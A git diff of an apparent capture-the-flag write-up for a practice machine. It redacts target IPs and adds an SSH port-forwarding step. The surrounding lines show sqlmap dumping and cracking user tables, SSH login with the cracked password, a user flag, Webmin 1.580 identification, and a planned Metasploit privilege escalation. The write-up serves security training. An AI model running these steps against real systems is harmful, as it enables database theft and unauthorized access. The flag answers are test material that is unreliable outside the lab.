@@ -91,7 +91,7 @@ Table: post
 | 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
 +----+--------------------------------+---------------------------------------------------------
 ...
-[03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/post.csv'                      ...
+[03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>/dump/db/post.csv'                      ...
 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 [03:13:14] [INFO] writing hashes to a temporary file '/tmp/sqlmapkoglbk6r247838/sqlmaphashes-tz21s7dm.txt' 
 do you want to crack them via a dictionary-based attack? [Y/n/q] Y
@@ -114,7 +114,7 @@ Table: users
 +------------------------------------------------------------------+----------+
 
 [03:15:09] [INFO] table 'db.users' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/users.csv'                                                                                                                      
-[03:15:09] [INFO] fetched data logged to text files under '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157'
+[03:15:09] [INFO] fetched data logged to text files under '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>'
 [03:15:09] [WARNING] your sqlmap version is outdated
 
 [*] ending @ 03:15:09 /2026-04-26/
@@ -143,13 +143,13 @@ Answer: videogamer124
 
 ## Q2 Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?
 ```
-$ ssh agent47@10.49.166.157                                            
-The authenticity of host '10.49.166.157 (10.49.166.157)' can't be established.
+$ ssh agent47@<TargetIP>                                            
+The authenticity of host '<TargetIP> (<TargetIP>)' can't be established.
 ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.49.166.157' (ED25519) to the list of known hosts.
-agent47@10.49.166.157's password: 
+Warning: Permanently added '<TargetIP>' (ED25519) to the list of known hosts.
+agent47@<TargetIP>'s password: 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -160,14 +160,14 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
 68 updates are security updates.
 
 
-Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+Last login: Fri Aug 16 17:52:04 2019 from <AttackBoxIP>
 agent47@gamezone:~$ ls
 user.txt
 agent47@gamezone:~$ cat user.txt
 649ac17b1480ac13ef1e4fa579dac95c
 agent47@gamezone:~$ exit
 logout
-Connection to 10.49.166.157 closed.
+Connection to <TargetIP> closed.
 ```
 Answer: 649ac17b1480ac13ef1e4fa579dac95c
 
@@ -208,11 +208,19 @@ tcp   LISTEN     0      128     :::80                  :::*
 tcp   LISTEN     0      128     :::22                  :::*                  
 agent47@gamezone:~$ ss -tulp
 ```
+Given point 10000 is the port of interest on target its possible to use 10000 locally but to avoid confusion on attacking vm i will use port 9000 to help clarify this:
+To connect to the service on port 10000 on target by port 9000 on localhost we can simply use:
+ssh -L 9000:localhost:10000 <username>@<TargetIP>
+
+## Note this will fail if the proxy from earlier SQLi request capture is still on so be sure to disable it.
+
 ## Q2 What is the name of the exposed CMS?
-Answer:Webmin appears in the top of the login screen or in code in title section: <Title> Login to Webmin </Title>
+Answer: Webmin appears in the top of the login screen or in code in title section: 
+<Title> Login to Webmin </Title>
+
 ## Q3 What is the CMS version?
 Answer: 1.580, login to webmin is the same password as to connect with SSH. Then its displayed in main screen on login or in the "System Information link".
 
-# Privilege Escalation with Metasploit
+# Task 6 Privilege Escalation with Metasploit
 
 Next take advantage of webadmin to gain by searching for exploit through searchsploit, this lead us to finding a exploit is available through metasploit.
